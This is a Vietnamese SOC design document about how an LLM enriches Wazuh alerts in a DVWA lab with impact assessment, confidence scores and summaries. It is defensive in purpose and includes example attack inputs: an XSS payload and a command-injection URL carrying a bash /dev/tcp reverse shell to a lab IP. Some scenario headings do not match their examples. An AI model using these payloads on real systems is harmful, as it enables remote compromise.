# 🤖 Vai Trò AI Trong Hệ Thống - Góc Nhìn SOC

**Ngày:** 2025-12-13  
**Người viết:** SOC Analyst  
**Mục đích:** Giải thích vai trò AI khi attacker tấn công và Wazuh cảnh báo

---

## 📊 SCENARIO: ATTACKER TẤN CÔNG SERVER

### **Bước 1: Attacker tấn công**

```
Attacker (172.16.69.175) 
  → Tấn công WebServer (192.168.20.125)
  → Payload: <script>alert('XSS')</script>
  → URL: /dvwa/vulnerabilities/xss/?name=<script>alert('XSS')</script>
```

### **Bước 2: Wazuh phát hiện (Rules đã setup)**

**Wazuh Rules đã có (từ local rules):**

**Web Attacks:**
- ✅ Rule 31110 (Level 7): "DVWA CSRF-like state change attempt" - Detect CSRF
- ✅ Rule 31111 (Level 8): "DVWA CSRF with off-site referer" - Detect CSRF with referer anomaly

**Command Injection:**
- ✅ Rule 100130 (Level 7): "DVWA Command Injection Attempt" - Detect command injection on exec endpoint
- ✅ Rule 100131 (Level 6): "Command Injection Attempt (unauthenticated/redirect)" - Detect failed attempt
- ✅ Rule 100144/100145/100146 (Level 12-13): "Command Injection - Reverse Shell" - Detect reverse shell patterns

**File Upload / Webshell:**
- ✅ Rule 100140 (Level 7): "DVWA Suspicious Upload (PHP tags)" - Detect PHP upload
- ✅ Rule 100141 (Level 7): "DVWA Suspicious Upload (webshell indicators)" - Detect webshell upload
- ✅ Rule 110200 (Level 6): "DVWA FIM: File changed in uploads" - Detect file change
- ✅ Rule 110201 (Level 10): "DVWA FIM: Suspicious script uploaded" - Detect suspicious script
- ✅ Rule 110202 (Level 13): **"CONFIRMED: Webshell indicators found"** - **CONFIRMED attack**

**CONFIRMED Attacks (Level 13 - Highest Priority):**
- ✅ Rule 110230 (Level 13): **"CONFIRMED: Command execution by web server"** - **CONFIRMED RCE**
- ✅ Rule 110231 (Level 13): **"CONFIRMED: Network connect (reverse shell)"** - **CONFIRMED reverse shell**

**DoS/DDoS:**
- ✅ Rule 100160 (Level 10): "HTTP DoS/Flood detected"
- ✅ Rule 100170 (Level 12): "TCP SYN Flood detected"

**Alert từ Wazuh (ví dụ):**
```
Wazuh Rule 100130 (Level 7) triggered
├─ Rule Description: "DVWA Command Injection Attempt (ET 2052797 - bash /dev/tcp)"
├─ Rule Groups: ["attack", "web", "command_injection", "reverse_shell_attempt", "suricata", "dvwa"]
├─ MITRE: T1190, T1059
├─ Agent: WebServer (001)
├─ Source IP: 172.16.69.175
├─ HTTP URL: /dvwa/vulnerabilities/exec/
├─ HTTP Method: POST
└─ HTTP Status: 200 (SUCCESSFUL attack)
```

**Wazuh đã làm:**
- ✅ Phát hiện command injection attack (Rule 100130)
- ✅ Gắn groups: ["attack", "web", "command_injection", "reverse_shell_attempt"]
- ✅ Set level 7
- ✅ Gắn MITRE: T1190, T1059

**Nhưng Wazuh KHÔNG trả lời:**
- ❌ Attack có **THÀNH CÔNG** không? (HTTP 200 = success, nhưng Wazuh không đánh giá impact)
- ❌ Mức độ nguy hiểm **THỰC SỰ** là gì? (Level 7 = medium, nhưng HTTP 200 + reverse shell = critical)
- ❌ Impact là gì? (Remote code execution? Reverse shell? Data breach?)
- ❌ Cần làm gì tiếp theo? (Block IP? Isolate server? Escalate?)
- ❌ Có phải false positive không? (Có thể là test/scan benign)
- ❌ Nếu là Rule 110230/110231 (CONFIRMED Level 13) → **ĐÃ THÀNH CÔNG**, cần immediate action

---

## 🤖 BƯỚC 3: AI PHÂN TÍCH (Vai Trò Của AI)

### **A. AI Nhận Input:**

**1. Alert Text (đã redact PII):**
```
Rule ID: 31105, Level: 7, Groups: web_attack, 
Suricata Signature ID: 2221036, 
Suricata Signature: ET WEB_SERVER Possible XSS Attack,
HTTP URL: /dvwa/vulnerabilities/xss/?name=[REDACTED],
HTTP Method: GET, HTTP Status: 200,
Message: Suricata: ET WEB_SERVER Possible XSS Attack,
Agent: WebServer, Src IP: [IP_A], User: [USER_B]
```

**2. Rule Context:**
```
- Rule ID: 31105
- Rule Level: 7
- Rule Description: "Web attack detected"
- Rule Groups: ["web_attack"]
- MITRE ATT&CK: []
```

**3. Rule-Specific Guidance (từ code):**
```
**CRITICAL: Rule 31105 = XSS (Cross-Site Scripting) Detection**
- This is a HIGH priority web attack that can steal sessions, inject malware, or deface websites.
- Look for XSS patterns: <script>, onerror=, javascript:, <img src=x onerror=, etc.
- If XSS detected → threat_level: "high" or "critical", confidence: >= 0.7
- Required tags: ["xss", "web_attack"]
```

---

### **B. AI Phân Tích (LLM Processing):**

**AI đóng vai "Senior SOC Analyst" và thực hiện:**

**1. Đọc và hiểu context:**
- ✅ Rule 31105 = XSS detection rule
- ✅ HTTP URL có `/xss/` → XSS vulnerability endpoint
- ✅ Suricata signature: "Possible XSS Attack"
- ✅ HTTP Status 200 → **SUCCESSFUL attack** (không phải chỉ là attempt)

**2. Phân loại attack type:**
- ✅ Phát hiện XSS pattern trong URL và signature
- ✅ Tag: `["xss", "web_attack"]`

**3. Đánh giá mức độ nguy hiểm:**
- ✅ HTTP 200 → Attack **THÀNH CÔNG**
- ✅ XSS có thể steal session, inject malware
- ✅ Threat level: **"high"** hoặc **"critical"**

**4. Tính confidence:**
- ✅ Rule 31105 + XSS pattern + HTTP 200 → Confidence cao
- ✅ Confidence: **0.7-0.8**

**5. Tạo summary cho SOC:**
- ✅ "XSS attack detected on WebServer /dvwa/vulnerabilities/xss/ endpoint. HTTP 200 response indicates successful exploitation. Potential session hijacking or credential theft."

---

### **C. AI Output:**

```json
{
  "summary": "XSS attack detected on WebServer /dvwa/vulnerabilities/xss/ endpoint. HTTP 200 response indicates successful exploitation.",
  "threat_level": "high",
  "confidence": 0.75,
  "tags": ["xss", "web_attack"]
}
```

---

## 🎯 BƯỚC 4: HỆ THỐNG SỬ DỤNG KẾT QUẢ AI

### **A. Score Fusion:**

```
Heuristic Score: 0.68 (rule level 7 + XSS multiplier 1.20)
LLM Confidence: 0.75 (AI đã nhận ra XSS)
Fused Score: (0.6 × 0.68) + (0.4 × 0.75) = 0.708
Threat Adjustment: +0.05 (high threat level)
Final Score: 0.758 ✅
```

### **B. Critical Attack Override (nếu score thấp):**

**Trường hợp AI không nhận ra XSS (confidence thấp):**
```
Heuristic: 0.68
LLM Confidence: 0.4 (không nhận ra XSS)
Fused: (0.6 × 0.68) + (0.4 × 0.4) = 0.568 ❌ (dưới threshold 0.70)
```

**Nhưng hệ thống vẫn gửi notification vì:**
- ✅ Rule 31105 trong `CRITICAL_ATTACK_RULES`
- ✅ Tag "xss" trong `CRITICAL_ATTACK_TAGS`
- ✅ **Override threshold** → Gửi notification dù score thấp

---

## 📋 TÓM TẮT VAI TRÒ AI

### **⚠️ QUAN TRỌNG: Wazuh Rules vs. AI Analysis**

**Wazuh Rules (đã setup):**
- ✅ **Phát hiện** attack (XSS, SQL injection, command injection, CSRF)
- ✅ **Gắn groups** (attack, xss, sql_injection, etc.)
- ✅ **Set level** (7, 8, 12, 13)

**AI Analysis (bổ sung Wazuh):**
- ✅ **Đánh giá impact cụ thể** (session hijacking, database breach, RCE, data exfiltration)
- ✅ **Đánh giá mức độ nguy hiểm thực sự** (threat_level: high/critical) dựa trên nhiều yếu tố kết hợp
- ✅ **Tính confidence** (độ tin cậy của phân tích - có thể là false positive?)
- ✅ **Tạo summary ngắn gọn** (1-2 câu cho SOC analyst, dễ đọc)
- ✅ **Giảm false positive** (phân biệt real attack vs. benign activity, test/scan)
- ✅ **Context về next steps** (Block IP? Isolate server? Escalate? Check logs?)
- ✅ **Phân tích kết hợp** (HTTP status + attack pattern + rule level + context + groups)

**→ Wazuh = Detection & Success Identification, AI = Impact Analysis & Prioritization**

---

### **1. Contextual Understanding (Hiểu Ngữ Cảnh)**

**Wazuh biết:**
- ✅ Rule 100132 = XSS attempt (từ rules đã setup)
- ✅ Groups: ["attack", "xss", "suricata"]
- ✅ Level: 7
- ✅ **Rule 31106** = "Web attack returned 200" (success indicator) - nếu có

**AI biết thêm (bổ sung Wazuh):**
- ✅ HTTP 200 + XSS → **Impact cụ thể**: Có thể **steal session**, **inject malware**, hoặc **deface website**
- ✅ HTTP 200 + XSS → Threat level **"high"** hoặc **"critical"** (dựa trên context, không chỉ rule level)
- ✅ **Confidence: 0.75** (rất chắc chắn đây là real attack, không phải false positive)
- ✅ **Summary**: "XSS attack detected... HTTP 200 indicates successful exploitation. Potential session hijacking or credential theft."
- ✅ **Next steps**: "Check web logs for follow-up RCE attempts; consider blocking src_ip if repeated."

**Giá trị:** SOC analyst biết **IMPACT CỤ THỂ** và **CẦN LÀM GÌ**, không chỉ biết "attack success".

---

### **2. Attack Classification (Phân Loại Attack) - Bổ Sung Wazuh**

**Wazuh đã có:**
- ✅ Rule 100132 → Groups: ["attack", "xss"]
- ✅ Rule 100131 → Groups: ["attack", "sql_injection"]
- ✅ Rule 100144/100145/100146 → Groups: ["attack", "command_injection"]

**AI bổ sung:**
- ✅ **Xác nhận** attack type từ Wazuh groups
- ✅ **Thêm tags** cho SOC workflow (xss, sql_injection, command_injection, path_traversal, csrf, web_attack)
- ✅ **Phân biệt** các loại attack tương tự (XSS vs. CSRF vs. SQL injection)

**Giá trị:** 
- SOC có thể filter/search alerts theo attack type (từ AI tags)
- AI tags được chuẩn hóa cho SOC workflow (không phụ thuộc Wazuh groups)

---

### **3. Threat Assessment (Đánh Giá Mức Độ Nguy Hiểm) - Bổ Sung Wazuh Level**

**Wazuh có:**
- ✅ Rule Level: 7, 8, 12, 13 (0-15 scale)
- ✅ **Phát hiện "attack success"** (Rule 31106, Rule 100130, Rule 100138)
- ✅ Rule descriptions phân biệt "attempt" vs "success"
- ❌ **KHÔNG** đánh giá **impact cụ thể** (session hijacking? database breach? RCE?)
- ❌ **KHÔNG** đánh giá **mức độ nguy hiểm thực sự** dựa trên context kết hợp

**AI đánh giá (bổ sung Wazuh):**
- ✅ **Threat Level:** `none`, `low`, `medium`, `high`, `critical`
- ✅ **Dựa trên kết hợp nhiều yếu tố:**
  - HTTP Status (200 = success → critical)
  - Attack pattern (reverse shell = critical)
  - Rule level (12+ = high/critical)
  - **Impact cụ thể** (session hijacking, database breach, RCE)
  - **Context** (endpoint, payload, response)

**Ví dụ:**
```
Wazuh Rule 100130 (Level 7):
├─ Wazuh: "DVWA Command Injection Attempt" (Level 7)
├─ Wazuh: HTTP 200 → Có thể là "success" (Rule 31106)
└─ AI: HTTP 200 + reverse shell pattern → Threat Level "critical" + Impact: "RCE risk"
```

**Giá trị:** SOC biết **IMPACT CỤ THỂ** và **MỨC ĐỘ NGUY HIỂM THỰC SỰ** (không chỉ dựa vào rule level hoặc HTTP status đơn lẻ).

---

### **4. Confidence Scoring (Độ Tin Cậy)**

**AI tính confidence:**
- 0.0-0.3: Low confidence (có thể là false positive)
- 0.4-0.7: Medium confidence
- 0.8-1.0: High confidence (rất chắc chắn)

**Giá trị:** SOC biết mức độ tin cậy của phân tích AI.

---

### **5. Summary Generation (Tạo Tóm Tắt)**

**AI tạo summary ngắn gọn:**
- 1-2 câu giải thích "cái gì xảy ra"
- Viết cho SOC incident ticket
- Dễ đọc, không cần technical deep dive

**Giá trị:** SOC analyst đọc summary là hiểu ngay, không cần đọc raw log.

---

### **6. False Positive Reduction (Giảm False Positive)**

**AI phân biệt:**
- ✅ Real attack vs. Benign activity
- ✅ Successful attack vs. Failed attempt
- ✅ Critical threat vs. Low-priority alert

**Giá trị:** SOC không bị spam bởi false positives.

---

### **7. Critical Attack Detection (Phát Hiện Attack Quan Trọng)**

**AI phát hiện critical attacks:**
- XSS, SQL injection, command injection
- Successful attacks (HTTP 200)
- High rule levels (>= 12)

**Giá trị:** Đảm bảo không bỏ qua attacks quan trọng dù score thấp.

---

## 🎯 SO SÁNH: KHÔNG AI vs. CÓ AI

### **Không AI (Chỉ Wazuh Rules + Heuristic):**

```
Alert từ Wazuh:
├─ Rule 100132, Level 7
├─ Groups: ["attack", "xss", "suricata"]
├─ Description: "Suricata: XSS attempt"
├─ Heuristic Score: 0.68
└─ Summary: "Suricata: XSS attempt"

Vấn đề:
❌ Không biết **impact cụ thể** (session hijacking? credential theft? RCE?)
❌ Không biết **mức độ nguy hiểm thực sự** dựa trên context kết hợp (Level 7 + HTTP 200 + attack pattern)
❌ Không có **confidence score** (có thể là false positive? Có chắc chắn là real attack?)
❌ Không có **summary ngắn gọn** cho SOC analyst (chỉ có rule description)
❌ Không có **context về next steps** (Block IP? Isolate server? Escalate?)
❌ SOC phải mở raw log để hiểu **impact** và **cần làm gì tiếp theo**
```

---

### **Có AI (Wazuh Rules + AI Analysis):**

```
Alert từ Wazuh:
├─ Rule 100132, Level 7
├─ Groups: ["attack", "xss", "suricata"]
├─ Description: "Suricata: XSS attempt"
├─ Heuristic Score: 0.68
├─ LLM Confidence: 0.75
├─ Fused Score: 0.758
├─ AI Tags: ["xss", "web_attack"]
├─ AI Threat Level: "high" (vì HTTP 200 = success)
└─ AI Summary: "XSS attack detected on WebServer /dvwa/vulnerabilities/xss/ endpoint. HTTP 200 response indicates successful exploitation."

Lợi ích:
✅ Xác nhận XSS attack (từ Wazuh groups)
✅ **Biết impact cụ thể** (session hijacking, credential theft) - Wazuh chỉ biết "success", không biết impact
✅ **Đánh giá mức độ nguy hiểm thực sự** (high/critical) dựa trên context kết hợp - không chỉ HTTP status hoặc rule level đơn lẻ
✅ **Có confidence score** (0.75 = rất chắc chắn, không phải false positive) - Wazuh không có
✅ **Có summary ngắn gọn** (1-2 câu, dễ đọc) - Wazuh chỉ có rule description
✅ **Có context về next steps** (Block IP? Check logs? Escalate?) - Wazuh không có
✅ SOC đọc summary là hiểu ngay **impact** và **cần làm gì** - không cần mở raw log
```

---

## 📊 VÍ DỤ THỰC TẾ

### **Scenario 1: XSS Attack**

**Input từ Wazuh (ví dụ Command Injection):**
```
Rule 100130, Level 7
Groups: ["attack", "web", "command_injection", "reverse_shell_attempt", "suricata", "dvwa"]
Description: "DVWA Command Injection Attempt (ET 2052797 - bash /dev/tcp)"
MITRE: T1190, T1059
URL: /dvwa/vulnerabilities/exec/
Method: POST
Status: 200
```

**AI Output:**
```json
{
  "summary": "Command injection attack detected on WebServer /dvwa/vulnerabilities/exec/ endpoint. HTTP 200 response with reverse shell pattern suggests successful remote code execution attempt.",
  "threat_level": "critical",
  "confidence": 0.85,
  "tags": ["command_injection", "web_attack"]
}
```

**Giá trị AI (bổ sung Wazuh):**
- ✅ Xác nhận command injection (từ Wazuh groups)
- ✅ Đánh giá: Critical threat (vì HTTP 200 + reverse shell pattern = RCE risk) - Wazuh chỉ có Level 7
- ✅ Context: Remote code execution risk - Wazuh không có
- ✅ Confidence: 0.85 (rất chắc chắn) - Wazuh không có

**Đặc biệt quan trọng với CONFIRMED Rules (Level 13):**
```
Rule 110230 (Level 13): "CONFIRMED: Command execution by web server"
Rule 110231 (Level 13): "CONFIRMED: Network connect (reverse shell)"
```

**AI sẽ:**
- ✅ Đánh giá: Threat level **"critical"** (vì đã CONFIRMED)
- ✅ Confidence: **0.95+** (rất chắc chắn)
- ✅ Summary: "CONFIRMED command execution detected. Immediate containment required."
- ✅ Override threshold: **BẮT BUỘC** (Rule level 13 >= 12)

---

### **Scenario 2: SQL Injection**

**Input từ Wazuh (ví dụ File Upload / Webshell):**
```
Rule 110202, Level 13
Groups: ["attack", "webshell", "file_upload", "fim", "dvwa"]
Description: "CONFIRMED: Webshell indicators found in uploaded/modified script (FIM diff match)"
MITRE: T1505.003
File: /var/www/html/dvwa/hackable/uploads/shell.php
```

**AI Output:**
```json
{
  "summary": "CONFIRMED webshell detected in uploaded file. FIM diff analysis shows malicious code patterns (eval, base64_decode, shell_exec). Immediate isolation and investigation required.",
  "threat_level": "critical",
  "confidence": 0.95,
  "tags": ["webshell", "file_upload", "command_execution"]
}
```

**Giá trị AI (bổ sung Wazuh):**
- ✅ Xác nhận webshell (từ Wazuh groups + FIM diff)
- ✅ Đánh giá: Critical (vì Level 13 = CONFIRMED) - Wazuh đã có Level 13, nhưng AI đánh giá impact
- ✅ Context: Command execution risk, potential data breach - Wazuh không có
- ✅ Confidence: 0.95 (rất chắc chắn vì CONFIRMED) - Wazuh không có
- ✅ Override threshold: **BẮT BUỘC** (Rule level 13 >= 12)

---

### **Scenario 3: Command Injection**

**Input từ Wazuh:**
```
Rule 100144, Level 13
Message: "Web attack detected"
URL: /dvwa/vulnerabilities/exec/?ip=127.0.0.1; /bin/bash -i >& /dev/tcp/172.16.69.175/4444 0>&1
Status: 200
```

**AI Output:**
```json
{
  "summary": "Command injection attack detected on WebServer /dvwa/vulnerabilities/exec/ endpoint. Reverse shell pattern suggests remote code execution attempt.",
  "threat_level": "critical",
  "confidence": 0.90,
  "tags": ["command_injection", "web_attack"]
}
```

**Giá trị AI:**
- ✅ Phân loại: Command injection (không phải generic)
- ✅ Đánh giá: Critical (vì có thể RCE)
- ✅ Context: Reverse shell pattern detected

---

## 🎯 KẾT LUẬN: VAI TRÒ AI

### **AI KHÔNG LÀM:**
- ❌ Phát hiện attack (Wazuh làm)
- ❌ Block attacker (Firewall/IPS làm)
- ❌ Tự động response (SOAR làm)

### **AI LÀM:**
1. ✅ **Phân loại attack type** (XSS, SQL injection, command injection, etc.)
2. ✅ **Đánh giá mức độ nguy hiểm** (none, low, medium, high, critical)
3. ✅ **Tính confidence** (độ tin cậy của phân tích)
4. ✅ **Tạo summary** (tóm tắt ngắn gọn cho SOC)
5. ✅ **Giảm false positive** (phân biệt real attack vs. benign)
6. ✅ **Phát hiện critical attacks** (đảm bảo không bỏ qua)

### **Giá Trị Cho SOC:**

**Trước AI:**
- SOC phải đọc raw log để hiểu attack type và impact
- Wazuh chỉ biết "attack success" (Rule 31106, Rule 100130), nhưng không biết impact cụ thể
- Không có context về next steps
- Không có confidence score (có thể là false positive?)
- Mất 5-10 phút để triage một alert

**Sau AI:**
- SOC đọc summary là hiểu ngay **impact cụ thể** và **cần làm gì**
- Biết chính xác attack type, impact (session hijacking, database breach, RCE), và next steps
- Có confidence score để quyết định (có chắc chắn là real attack?)
- Mất 30-60 giây để triage một alert

**ROI:**
- ⏱️ **Tiết kiệm 80-90% thời gian triage**
- 🎯 **Tăng accuracy** (phân loại đúng attack type)
- 🚨 **Giảm false negative** (không bỏ qua critical attacks)
- 📊 **Cải thiện prioritization** (ưu tiên alerts quan trọng)

---

## 📋 TRẢ LỜI CÂU HỎI

**Q: "Khi attacker tấn công server và Wazuh cảnh báo (rules đã setup), AI làm nhiệm vụ gì?"**

**A:**

**Wazuh đã làm (rules đã setup):**
- ✅ Phát hiện attack (Rule 100132 = XSS, Rule 100131 = SQL injection, etc.)
- ✅ Gắn groups (["attack", "xss", "suricata"])
- ✅ Set level (7, 8, 12, 13)
- ✅ **Phát hiện "attack success"** (Rule 31106: "Web attack returned 200", Rule 100130: "Web attack success", Rule 100138: "Command injection success")

**AI bổ sung (impact analysis & prioritization):**
1. **Đọc và hiểu** toàn bộ alert context (rule, groups, HTTP status, URL, payload, Suricata signature)
2. **Xác nhận** attack type từ Wazuh groups (XSS, SQL injection, command injection, etc.)
3. **Đánh giá impact cụ thể** (session hijacking? database breach? RCE? data exfiltration?) - Wazuh chỉ biết "success", không biết impact
4. **Đánh giá mức độ nguy hiểm thực sự** (threat_level: high/critical) dựa trên context kết hợp - không chỉ HTTP status hoặc rule level đơn lẻ
5. **Tính confidence** (0.0-1.0) về độ chính xác của phân tích - có thể là false positive?
6. **Tạo summary ngắn gọn** (1-2 câu) giải thích "cái gì xảy ra" + impact + next steps
7. **Gắn tags** chuẩn hóa (xss, sql_injection, web_attack, etc.) cho SOC workflow
8. **Giảm false positive** (phân biệt real attack vs. benign activity, test/scan)
9. **Đảm bảo** critical attacks không bị bỏ qua (override threshold nếu cần)

**Kết quả:** SOC analyst nhận được alert đã được **phân tích impact, đánh giá mức độ nguy hiểm, và tóm tắt** sẵn, biết **impact cụ thể** và **cần làm gì tiếp theo**, không cần mở raw log để hiểu.

---

## 🎯 TÓM TẮT

**Wazuh Rules (đã setup):**
- ✅ Phát hiện attack (XSS, SQL injection, command injection, CSRF)
- ✅ Gắn groups (attack, xss, sql_injection, etc.)
- ✅ Set level (7, 8, 12, 13)

**AI = "Junior SOC Analyst" tự động (bổ sung Wazuh):**
- ✅ Đọc và hiểu toàn bộ alert context
- ✅ Xác nhận attack type từ Wazuh groups
- ✅ Đánh giá attack có **THÀNH CÔNG** không (HTTP 200 = success)
- ✅ Đánh giá mức độ nguy hiểm **THỰC SỰ** (threat_level, không chỉ rule level)
- ✅ Tính confidence (độ tin cậy)
- ✅ Tạo summary với context về impact
- ✅ Gắn tags chuẩn hóa cho SOC workflow
- ✅ Giảm false positive

**Giá trị:** 
- SOC analyst tiết kiệm 80-90% thời gian triage
- Biết attack có thành công không (HTTP 200)
- Biết mức độ nguy hiểm thực sự (threat_level)
- Có context về impact (session hijacking, database breach, RCE)
- Tập trung vào investigation và response thay vì đọc raw logs

